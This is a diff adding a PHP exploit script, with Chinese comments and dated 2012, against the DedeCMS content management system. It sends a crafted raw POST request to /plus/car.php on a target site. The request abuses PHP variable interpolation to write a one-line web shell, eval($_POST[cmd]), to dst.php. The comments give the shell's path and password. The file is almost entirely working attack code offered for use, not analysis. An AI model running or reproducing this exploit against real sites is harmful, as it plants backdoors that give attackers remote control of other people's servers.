@@ -1,0 +1,38 @@
+<?php
+//author：舞林
+//date  : 2012-03-21 00:31:05
+//shell一句话地址，/plus/dst.php 密码cmd
+//www.t.com/dede/plus/car.php
+
+
+error_reporting(E_ERROR);
+set_time_limit(0);
+$url = ''www.t.com'';    //目标站url
+$dir = ''/dede'';        //dedecms安装目录
+
+
+//$content = ''$a=${@phpinfo()};'';
+$content = ''$a=${@file_put_contents("dst.php","<?php eval(\$_POST[cmd]); ?>")};'';
+
+
+$data = "POST $dir/plus/car.php HTTP/1.1\r\n";
+$data .= "Host: localhost\r\n";
+$data .= "User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\r\n";
+$data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+$data .= "Content-Length:        ".strlen($content)."\r\n\r\n";
+$data .= $content."\r\n";
+
+
+$socket=fsockopen($url,''80'');
+if ($socket) {
+        fwrite($socket,$data);
+        while (!feof($socket)) {
+                $exp.=fgets($socket, 1024);
+        }
+        echo $exp;
+}else{
+        echo ''socket err'';
+}
+
+
+?>
